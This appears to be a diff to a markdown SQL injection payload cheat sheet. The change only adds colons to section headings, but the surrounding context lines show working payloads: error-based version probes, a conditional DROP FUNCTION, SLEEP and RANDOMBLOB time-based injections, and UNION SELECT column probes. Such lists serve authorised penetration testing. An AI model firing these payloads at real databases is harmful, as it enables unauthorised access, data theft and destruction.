@@ -58,7 +58,8 @@ Moreover, SQL injection attacks can escalate, enabling attackers to breach the u
 These tools cover a broad spectrum of SQL injection and vulnerability testing scenarios, offering different methods and approaches to detect, exploit, and secure databases.
 
 
-### **SQL Injection Payloads**
+### **SQL Injection Payloads:**
+
 
 ```SQL Injection
 '
@@ -150,7 +151,7 @@ Comments:
 ;%00	Nullbyte
 `	    Backtick
 ```
-### **Error Based Payloads**
+### **Error Based Payloads:**
 
 
 ```Error Based
@@ -309,7 +310,7 @@ IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
  and (select substring(@@version,3,1))='S'
  and (select substring(@@version,3,1))='X'
 ```
-### **Time Based Payloads**
+### **Time Based Payloads:**
 
 ```
 # from wapiti
@@ -409,7 +410,7 @@ OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
 SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
 ```
 
-### **Union Select Payloads**
+### **Union Select Payloads:**
 
 ```
 ORDER BY SLEEP(5)
@@ -832,7 +833,7 @@ ORDER BY SLEEP(5)
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
 ```
-### **Authentication Bypass Payloads**
+### **Authentication Bypass Payloads:**
 
 
 ```
